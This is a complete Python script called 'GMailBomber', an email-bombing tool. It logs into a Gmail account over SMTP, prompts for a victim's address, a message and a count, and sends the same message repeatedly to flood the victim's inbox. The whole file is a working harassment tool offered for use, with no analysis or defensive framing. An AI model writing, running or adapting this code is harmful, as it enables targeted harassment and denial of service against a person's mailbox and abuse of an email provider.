import os
import sys
import getpass
import smtplib

BLUE = '\33[94m'
LightBlue = '\033[94m'
RED = '\033[91m'
WHITE = '\33[97m'
YELLOW = '\33[93m'
GREEN = '\033[32m'
LightCyan    = "\033[96m"
END = '\033[0m'

if len(sys.argv) < 2:
    os.system("clear || cls")
    sys.stdout.write(RED + """
╭━━┳━┳━╮╱╱╭╮╱╭━━╮╱╱╱╱╭╮
┃╭━┫┃┃┃┣━╮┣╋╮┃╭╮┣━┳━━┫╰┳━┳┳╮
┃╰╮┃┃┃┃┃╋╰┫┃╰┫╭╮┃╋┃┃┃┃╋┃┻┫╭╯
╰━━┻┻━┻┻━━┻┻━┻━━┻━┻┻┻┻━┻━┻╯
    """  + END+BLUE+'GMailBomber'.format(RED, END).center(69) +
    '\n' + '\tGMailBomber brought to you by {}muneebwanee.'.format(YELLOW, RED, YELLOW, BLUE).center(76) +
    '\n' + '\tGithub: muneebwanee\n'.format(YELLOW).center(80) +
    '\n' + '\tVersion: {}1.0{}\n'.format(YELLOW, END).center(80) + '\n')
else:
    sys.exit('Usage: python bomber.py')
    os.system("clear || cls")

email = input(LightCyan+'[?] '+YELLOW+' Enter Your Email Address : '+RED)
pswd = getpass.getpass(LightCyan+'[?] '+YELLOW+' Enter Your Password : '+RED)
vemail = input(LightCyan+'[?] '+YELLOW+' Enter Vicitm Email Address : '+RED)
#subject = input(LightCyan+'[?] '+YELLOW+' Enter The Subject : '+RED)
message = input(LightCyan+'[?] '+YELLOW+' Enter Your Message Here : '+RED)
count = int(input(LightCyan+'[?] '+YELLOW+' How Many Time You Want To Send : '+RED))
print()
#BODY = "\r\n".join(("From: %s" % email,"To: %s" % vemail,"Subject: %s" % subject ,"",message))
try:
    smtp_server = 'smtp.gmail.com'
    port = 587
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(email,pswd)
    i = 0
    print(LightCyan+'[*] '+YELLOW+' Sending is in Progress \n')
    while i < count:
        i+=1
        server.sendmail(email,vemail,message)
        #server.sendmail(email,vemail,BODY)
        if i == 1:
            print (LightCyan+'[✓] '+YELLOW+' %dst Email has been sent successfully ' %(i))
        elif i == 2:
            print (LightCyan+'[✓] '+YELLOW+' %dnd Email has been sent successfully ' %(i))
        elif i == 3:
            print (LightCyan+'[✓] '+YELLOW+' %drd Email has been sent successfully ' %(i))
        else:
            print (LightCyan+'[✓] '+YELLOW+' %dth Email has been sent successfully ' %(i))
        sys.stdout.flush()
    server.quit()
    print(LightCyan+'[✓] '+YELLOW+'All done'+END)

except KeyboardInterrupt:
    print(" ")
    print (LightCyan+'[x] '+YELLOW+' Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print(LightCyan+'[x] '+RED+' The username or password you entered is incorrect.'+END)
    print (LightCyan+'[x] '+RED+' Check if the Options of Applications are less secure is enabled '+END)
    sys.exit()
